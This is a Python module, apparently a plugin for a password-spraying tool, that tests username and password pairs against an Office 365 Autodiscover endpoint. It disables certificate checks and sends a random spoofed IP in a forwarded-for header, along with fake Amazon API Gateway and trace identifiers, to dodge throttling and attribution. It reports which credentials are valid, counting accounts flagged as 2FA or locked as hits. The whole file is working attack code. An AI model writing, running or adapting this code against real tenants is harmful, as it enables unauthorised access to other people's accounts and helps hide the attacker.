import json, datetime, requests, random
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)


def generate_ip():

    return ".".join(str(random.randint(0,255)) for _ in range(4))


def generate_id():

    return "".join(random.choice("0123456789abcdefghijklmnopqrstuvwxyz") for _ in range(10))


def generate_trace_id():
    str = "Root=1-"
    first = "".join(random.choice("0123456789abcdef") for _ in range(8))
    second = "".join(random.choice("0123456789abcdef") for _ in range(24))
    return str + first + "-" + second


def o365_authenticate(url, username, password, useragent, pluginargs):

    ts = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')

    data_response = {
        'timestamp': ts,
        'username': username,
        'password': password,
        'success': False,
        'change': False,
        '2fa_enabled': False,
        'type': None,
        'code': None,
        'name': None,
        'action': None,
        'headers': [],
        'cookies': [],
        'sourceip' : None,
        'throttled' : False,
		'error' : False,
        'output' : ""
    }

    spoofed_ip = generate_ip()
    amazon_id = generate_id()
    trace_id = generate_trace_id()

    headers = {
        'User-Agent': useragent,
        "X-My-X-Forwarded-For" : spoofed_ip,
        "x-amzn-apigateway-api-id" : amazon_id,
        "X-My-X-Amzn-Trace-Id" : trace_id,

        "Content-Type": "text/xml"
    }

    try:
        r = requests.get("{}/autodiscover/autodiscover.xml".format(url), auth=(username, password), headers=headers, verify=False, timeout=30)

        if r.status_code == 200:
            data_response['output'] = "SUCCESS: {username}:{password}".format(username=username,password=password)
            data_response['success'] = True
        elif r.status_code == 456:
            data_response['output'] = "SUCCESS: {username}:{password} - 2FA or Locked".format(username=username,password=password)
            data_response['success'] = True
        else:
            data_response['output'] = "FAILED: {username}:{password}".format(username=username,password=password)
            data_response['success'] = False


    except Exception as ex:
        data_response['error'] = True
        data_response['output'] = ex
        pass

    return data_response
